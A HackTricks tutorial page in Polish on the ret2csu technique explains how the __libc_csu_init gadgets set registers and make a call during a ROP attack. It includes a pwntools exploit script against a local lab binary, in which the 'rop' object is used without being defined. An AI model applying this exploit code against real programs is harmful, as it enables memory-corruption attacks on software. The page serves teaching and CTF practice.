# Ret2csu

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

**ret2csu** to technika hackingowa używana, gdy próbujesz przejąć kontrolę nad programem, ale nie możesz znaleźć **gadżetów**, których zwykle używasz do manipulowania zachowaniem programu.&#x20;

Gdy program korzysta z określonych bibliotek (takich jak libc), ma wbudowane funkcje do zarządzania tym, jak różne części programu komunikują się ze sobą. Wśród tych funkcji znajdują się ukryte skarby, które mogą działać jako nasze brakujące gadżety, szczególnie jeden zwany `__libc_csu_init`.

### Magiczne gadżety w \_\_libc_csu_init

W `__libc_csu_init` znajdują się dwie sekwencje instrukcji (nasze "magiczne gadżety"), które wyróżniają się:

1. Pierwsza sekwencja pozwala nam ustawić wartości w kilku rejestrach (rbx, rbp, r12, r13, r14, r15). To jak sloty, w których możemy przechowywać liczby lub adresy, które chcemy użyć później.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
To urządzenie pozwala nam kontrolować te rejestry, wypychając wartości ze stosu do nich.

2. Druga sekwencja wykorzystuje wartości, które ustawiliśmy, aby zrobić kilka rzeczy:
- **Przenieść konkretne wartości do innych rejestrów**, przygotowując je do użycia jako parametry w funkcjach.
- **Wykonać wywołanie do lokalizacji** określonej przez dodanie wartości w r15 i rbx, a następnie pomnożenie rbx przez 8.
```
mov rdx, r14;
mov rsi, r13;
mov edi, r12d;
call qword [r15 + rbx*8];
```
## Przykład

Wyobraź sobie, że chcesz wykonać syscall lub wywołać funkcję taką jak `write()`, ale potrzebujesz konkretnych wartości w rejestrach `rdx` i `rsi` jako parametrów. Zwykle szukałbyś gadżetów, które bezpośrednio ustawiają te rejestry, ale nie możesz ich znaleźć.

Tutaj wchodzi w grę **ret2csu**:

1. **Ustaw rejestry**: Użyj pierwszego magicznego gadżetu, aby zrzucić wartości ze stosu do rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) i r15.
2. **Użyj drugiego gadżetu**: Gdy te rejestry są ustawione, używasz drugiego gadżetu. To pozwala ci przenieść wybrane wartości do `rdx` i `rsi` (z r14 i r13, odpowiednio), przygotowując parametry do wywołania funkcji. Co więcej, kontrolując `r15` i `rbx`, możesz sprawić, że program wywoła funkcję znajdującą się pod adresem, który obliczasz i umieszczasz w `[r15 + rbx*8]`.

Masz [**przykład użycia tej techniki i wyjaśnienia go tutaj**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), a oto ostateczny exploit, który wykorzystano:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
> [!WARNING]
> Zauważ, że poprzedni exploit nie ma na celu wykonania **`RCE`**, ma na celu jedynie wywołanie funkcji o nazwie `win` (biorąc adres `win` z stdin wywołując gets w łańcuchu ROP i przechowując go w r15) z trzecim argumentem o wartości `0xdeadbeefcafed00d`.

### Dlaczego nie używać bezpośrednio libc?

Zazwyczaj te przypadki są również podatne na [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), ale czasami musisz kontrolować więcej parametrów, niż można łatwo kontrolować za pomocą gadżetów, które znajdziesz bezpośrednio w libc. Na przykład, funkcja `write()` wymaga trzech parametrów, a **znalezienie gadżetów do ustawienia wszystkich tych parametrów bezpośrednio może być niemożliwe**.

{{#include ../../../banners/hacktricks-training.md}}
